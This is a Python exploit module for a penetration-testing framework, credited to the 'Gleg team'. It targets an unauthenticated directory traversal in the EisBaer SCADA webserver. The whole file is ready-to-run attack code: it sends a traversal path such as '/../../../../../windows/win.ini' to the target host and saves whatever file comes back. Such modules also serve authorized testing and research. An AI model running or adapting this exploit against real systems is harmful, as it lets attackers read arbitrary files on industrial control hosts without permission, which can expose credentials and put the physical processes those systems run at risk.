#!/usr/bin/env python

import urllib2
import os
from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_eisbaer_scada_dt"
INFO['DESCRIPTION'] = "EisBaer Scada Webserver Directory Traversal"
INFO['VENDOR'] = "http://www.busbaer.de/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Vulnerability allows unauthenticated user read content of arbitrary file on remote machine.
    Tested against version 2.1 on Windows 7 x64.
"""
INFO["DOWNLOAD_LINK"] = "http://www.busbaer.de/eiscomp,index,op,sub,op1,24.html"
INFO["LINKS"] = [""]
INFO['CHANGELOG'] = "26 Apr, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.222"
OPTIONS["PORT"] = 80
OPTIONS["HTTPS"] = False
OPTIONS["FILENAME"] = "/../../../../../windows/win.ini"


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.ports_map = {}

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.https = self.args.get("HTTPS", OPTIONS["HTTPS"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])
        protocol = "https" if self.https else "http"
        self.url = "{}://{}:{}".format(protocol, self.host, self.port)

    def run(self):
        # Get options from gui
        self.args()
        resp = urllib2.urlopen(self.url + self.filename)
        if resp.code != 200:
            self.log("File not exists")
            self.finish(False)
        content = resp.read()
        filename = os.path.basename(self.filename)
        self.writefile(content, filename)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()